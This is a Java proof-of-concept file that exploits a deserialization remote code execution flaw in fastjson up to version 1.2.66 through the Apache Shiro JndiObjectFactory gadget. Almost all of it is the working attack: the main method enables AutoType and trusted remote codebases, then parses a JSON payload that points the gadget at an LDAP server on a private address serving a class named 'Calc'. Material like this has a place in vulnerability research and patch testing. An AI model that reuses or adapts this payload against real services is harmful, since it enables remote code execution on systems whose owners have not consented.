package com.ja0k.bug.fastjson.rce;

//org.apache.shiro.jndi.JndiObjectFactory

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
/**
 *
 *  fastjson <= 1.2.66 RCE，需要开启AutoType
 *
 *  JndiObjectFactory依赖的gadget
*  <dependency>
*  <groupId>com.alibaba</groupId>
*  <artifactId>fastjson</artifactId>
*  <version>1.2.66</version>
*  </dependency>

 *  <dependency>
 *  <groupId>org.apache.shiro</groupId>
 *  <artifactId>shiro-core</artifactId>
 *  <version>1.5.1</version>
 *  </dependency>
 **/

public class JndiObjectFactory {
    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);

        String payload = "{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"ldap://192.168.80.1:1389/Calc\"}";
        try {
            JSON.parseObject(payload);
        } catch (Exception e) {
            e.printStackTrace();
        }

    }
}
